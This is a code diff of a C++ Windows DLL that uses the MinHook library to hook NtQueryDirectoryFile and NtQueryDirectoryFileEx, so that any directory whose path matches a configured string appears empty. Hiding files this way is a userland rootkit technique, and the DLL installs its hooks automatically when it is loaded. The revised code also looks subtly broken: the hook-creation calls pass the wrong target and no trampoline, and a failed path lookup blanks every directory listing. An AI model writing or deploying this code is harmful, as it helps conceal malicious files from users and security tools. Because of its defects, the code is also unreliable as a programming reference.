@@ -1,9 +1,17 @@
+// MeuHookDLL.cpp
+#include "pch.h"
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+#include "MinHook.h"
 #include "config.hpp"
 
-typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE)(
+#pragma comment(lib, "libMinHook.x64.lib")
+
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFile)(
     HANDLE FileHandle,
     HANDLE Event,
-    PVOID ApcRoutine,
+    PIO_APC_ROUTINE ApcRoutine,
     PVOID ApcContext,
     PIO_STATUS_BLOCK IoStatusBlock,
     PVOID FileInformation,
@@ -14,10 +22,10 @@ typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE)(
     BOOLEAN RestartScan
     );
 
-typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE_EX)(
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFileEx)(
     HANDLE FileHandle,
     HANDLE Event,
-    PVOID ApcRoutine,
+    PIO_APC_ROUTINE ApcRoutine,
     PVOID ApcContext,
     PIO_STATUS_BLOCK IoStatusBlock,
     PVOID FileInformation,
@@ -27,83 +35,63 @@ typedef NTSTATUS(WINAPI* PNT_QUERY_DIRECTORY_FILE_EX)(
     PUNICODE_STRING FileName
     );
 
-PNT_QUERY_DIRECTORY_FILE Original_NtQueryDirectoryFile;
-PNT_QUERY_DIRECTORY_FILE New_NtQueryDirectoryFile;
+static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
+static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;
 
-PNT_QUERY_DIRECTORY_FILE_EX Original_NtQueryDirectoryFileEx;
-PNT_QUERY_DIRECTORY_FILE_EX New_NtQueryDirectoryFileEx;
+static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+    NTSTATUS status = STATUS_NO_MORE_FILES;
+    WCHAR dirPath[MAX_PATH + 1] = { 0 };
 
-NTSTATUS WINAPI Hooked_NtQueryDirectoryFile(
-    HANDLE FileHandle,
-    HANDLE Event,
-    PVOID ApcRoutine,
-    PVOID ApcContext,
-    PIO_STATUS_BLOCK IoStatusBlock,
-    PVOID FileInformation,
-    ULONG Length,
-    FILE_INFORMATION_CLASS FileInformationClass,
-    BOOLEAN ReturnSingleEntry,
-    PUNICODE_STRING FileName,
-    BOOLEAN RestartScan
-)
-{
-    if (FileName && FileName->Buffer &&
-        wcsstr(FileName->Buffer, PathHide) != nullptr)
-    {
-        RtlZeroMemory(FileInformation, Length);
-        return STATUS_NO_MORE_FILES; 
+    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+        if (wcsstr(dirPath, PathHide)) {
+            RtlZeroMemory(FileInformation, Length);
+        }
+        else {
+            status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+        }
     }
 
-    return Original_NtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+    return status;
 }
 
-NTSTATUS WINAPI Hooked_NtQueryDirectoryFileEx(
-    HANDLE FileHandle,
-    HANDLE Event,
-    PVOID ApcRoutine,
-    PVOID ApcContext,
-    PIO_STATUS_BLOCK IoStatusBlock,
-    PVOID FileInformation,
-    ULONG Length,
-    FILE_INFORMATION_CLASS FileInformationClass,
-    ULONG QueryFlags,
-    PUNICODE_STRING FileName
-)
-{
-    if (FileName && FileName->Buffer &&
-        wcsstr(FileName->Buffer, PathHide) != nullptr)
-    {
-        RtlZeroMemory(FileInformation, Length);
-        return STATUS_NO_MORE_FILES; 
+static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
+    NTSTATUS status = STATUS_NO_MORE_FILES;
+    WCHAR dirPath[MAX_PATH + 1] = { 0 };
+
+    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+        if (wcsstr(dirPath, PathHide)) {
+            RtlZeroMemory(FileInformation, Length);
+        }
+        else {
+            status = originalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+        }
     }
 
-    return Original_NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+    return status;
 }
 
-
-bool set_directory_hooks()
-{
-    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
-    Original_NtQueryDirectoryFile = (PNT_QUERY_DIRECTORY_FILE)GetProcAddress(ntdll, "NtQueryDirectoryFile");
-
-    if (MH_Initialize() != MH_OK) { return false; }
-
-    if (MH_CreateHook(Original_NtQueryDirectoryFile, &Hooked_NtQueryDirectoryFile,
-        (LPVOID*)&New_NtQueryDirectoryFile) != MH_OK) {
-        return false;
+BOOL StartHook() {
+    if (MH_Initialize() != MH_OK) {
+        return FALSE;
     }
 
-    if (MH_EnableHook(Original_NtQueryDirectoryFile) != MH_OK) { return false; }
+    HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
+    originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
+    originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
 
-    Original_NtQueryDirectoryFileEx = (PNT_QUERY_DIRECTORY_FILE_EX)GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
-    if (MH_CreateHook(Original_NtQueryDirectoryFileEx, &Hooked_NtQueryDirectoryFileEx,
-        (LPVOID*)&New_NtQueryDirectoryFileEx) != MH_OK) {
-        return false;
+    if (MH_CreateHook(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile, NULL) != MH_OK) {
+        return FALSE;
     }
 
-    if (MH_EnableHook(Original_NtQueryDirectoryFileEx) != MH_OK) { return false; }
+    if (MH_CreateHook(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx, NULL) != MH_OK) {
+        return FALSE;
+    }
 
-    return true;
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) {
+        return FALSE;
+    }
+
+    return TRUE;
 }
 
 bool CreateDirectoryIfNotExists()
@@ -118,17 +106,14 @@ bool CreateDirectoryIfNotExists()
     }
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
-{
-
-    switch (fdwReason)
-    {
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
         CreateDirectoryIfNotExists();
-        if (!set_directory_hooks()) {
-            return FALSE;
-        }
+        StartHook();
         break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
     }
